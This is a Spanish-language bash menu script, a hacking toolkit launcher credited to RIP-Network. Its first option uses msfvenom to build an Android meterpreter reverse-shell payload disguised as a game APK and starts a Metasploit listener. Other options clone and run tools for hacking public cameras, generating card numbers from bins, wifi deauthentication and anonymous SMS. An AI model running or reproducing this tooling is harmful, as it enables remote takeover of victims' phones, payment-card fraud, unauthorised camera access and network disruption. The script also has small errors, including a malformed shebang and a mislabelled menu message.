#!bin/bash
clear
sleep 2
echo "██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ "
echo "██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗"
echo "██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║"
echo "██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║"
echo "██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║"
echo "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
echo "              ,---------------------------,"
echo "              |  /---------------------\  |"
echo "              | |                       | |"
echo "              | |   Creado              | |"
echo "              | |       por             | |"
echo "              | |        RIP-Network    | |"
echo "              | |                       | |"
echo "              |  \_____________________/  |"
echo "              |___________________________|"
echo "            ,---\_____     []     _______/------,"
echo "          /         /______________\           /|"
echo "        /___________________________________ /  | ___"
echo "        |    version 1.0                    |   |    )"
echo "        |  _ Parrot OS_ _        [-------]  |   |   ("
echo "        |  o o o                 [-------]  |  /    _)_"
echo "        |__________________________________ |/     /  /"
echo "    /-------------------------------------/|      ( )/"
echo "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /"
echo "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /"
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"


PS3="Elige tu opción: "
opciones=("Crear msfvenom red local" "Camaras Mundiales" "Generador Bins" "Entrar DeepWeeb" "Verificar un email" "Scan de redes wifi" "Mensage anonimo" "Hash identificador" "Informacion de pagina" "salir")
select opt in "${opciones[@]}"
do
    case $opt in 

        "Crear msfvenom red local") echo "Has elegido Crackear zip $CONT "
                clear
                ifconfig
                read -p "[*] Escriba su IP de la red local: " ip
                read -p "[*] Escribe un Puerto ejem : 4444 : " puerto
                read -p "[*] Escribe nombre del juego : " juego

                msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $juego.apk
                clear
                echo "use exploit/multi/handler"
                echo "set payload android/meterpreter/reverse_tcp"
                echo "set LHOST $ip "
                echo "set LPORT $puerto "
                echo "exploit"
                xterm -T "RIP-Network Terminal" -geometry 100x30 -e "msfconsole"
                break
        ;;

        "Camaras Mundiales") echo "Has elegido Camaras $CONT " 
                clear
                git clone https://github.com/AngelSecurityTeam/Cam-Hackers
                cd Cam-Hackers
                pip install -r requirements.txt
                clear
                python3 cam-hackers.py
                break

                
        ;;

        "Generador Bins") echo "Has elegido Bins $CONT "
                clear
                git clone https://github.com/Scorpio28-Oficial/Live-Generator
                cd Live-Generator
                python Live-Generator.py
                read -p "[*] Escribe la Bin con las xxxx : " bin1
                python3 Live-Generator.py -b $bin1 -u 30 -d -c 
                break
        ;;

        "Entrar DeepWeeb") echo "Has elegido entrar a la Dark $CONT " 
                clear
                apt install tor
                open https://thehiddenwiki.org/
                echo "Si te salto error quita el root y vuelve a ejecutar "
                break

                
        ;;

        "Verificar un email") echo "Has elegido Verificar $CONT "
                clear
                git clone https://github.com/RIP-Network/EmailChecker
                cd EmailChecker
                bash email.sh
                break

                
        ;;

        "Scan de redes wifi") echo "Has elegido redes wifi $CONT " 
                clear
                git clone https://github.com/RIP-Network/Deauther
                cd Deauther
                bash deauther.sh
                break

                
        ;;

        "Mensage anonimo") echo "Has elegido enviar $CONT " 
                clear
                git clone https://github.com/Darkmux/DarkSMS
                cd DarkSMS
                bash darksms.sh
                break

                
        ;;

        "Hash identificador") echo "Has elegido hash $CONT " 
                clear
                git clone https://github.com/blackploit/hash-identifier
                cd hash-identifier
                python3 hash-id.py
                break

                
        ;;

        "Informacion de pagina") echo "Has elegido pagina $CONT " 
                clear
                sudo apt-get install whatweb
                read -p "[*] Escriba el nombre de la pagina web ejem : https://codes.com : " pagina
                whatweb --no-errors -v $pagina
                break

        ;;




        "salir") break 
        ;;
        *) echo "Opcion no válida."
    esac
done